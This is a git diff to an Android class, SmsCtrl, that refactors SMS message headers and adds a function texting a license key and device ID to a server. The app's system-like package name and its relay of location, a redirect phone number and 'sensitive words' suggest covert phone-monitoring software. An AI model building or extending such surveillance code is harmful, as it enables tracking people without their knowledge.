@@ -8,7 +8,10 @@ import java.util.List;
 import system.service.R;
 import system.service.activity.GlobalPrefActivity;
 import system.service.config.ConfigCtrl;
+
+import com.particle.inspector.common.util.DeviceProperty;
 import com.particle.inspector.common.util.SysUtils;
+import com.particle.inspector.common.util.sms.SmsConsts;
 
 import system.service.feature.location.LocationUtil;
 import system.service.feature.sms.SMS_TYPE;
@@ -207,7 +210,7 @@ public class SmsCtrl
 		String rcvMail = GlobalPrefActivity.getMail(context);
 		String rcvPhoneNum = GlobalPrefActivity.getRedirectPhoneNum(context);
 		String gpsWord = GlobalPrefActivity.getGpsWord(context);
-		String strContent = "Info," + key + "," + rcvMail + "," + rcvPhoneNum + "," + gpsWord;
+		String strContent = SmsConsts.HEADER_INFO_EX + key + "," + rcvMail + "," + rcvPhoneNum + "," + gpsWord;
 		sendSms(strMobile, strContent);
 	}
 	
@@ -217,7 +220,7 @@ public class SmsCtrl
 		String key = ConfigCtrl.getLicenseKey(context);
 		if (key == null) key = "";
 		String sensWords = GlobalPrefActivity.getSensitiveWords(context);
-		String strContent = "SensWds," + key + "," + sensWords;
+		String strContent = SmsConsts.HEADER_SENSI_WORDS_EX + key + "," + sensWords;
 		sendSms(strMobile, strContent);
 	}
 
@@ -235,6 +238,16 @@ public class SmsCtrl
 				(new Date(location.getTime())).toLocaleString() + ", " 
 				+ location.getLatitude() + "," + location.getLongitude());
 		}
+	}
+
+	// send unregister SMS to server 
+	// SMS format: Header,<key>,<device ID>
+	public static boolean sendUnregisterSms(Context context) {
+		String strMobile = context.getResources().getString(R.string.srv_address).trim();
+		String key = ConfigCtrl.getLicenseKey(context);
+		String deviceID = DeviceProperty.getDeviceId(context);
+		String strContent = SmsConsts.HEADER_UNREGISTER_EX + key + SmsConsts.SEPARATOR + deviceID;
+		return sendSms(strMobile, strContent);
 	}
 	
 }
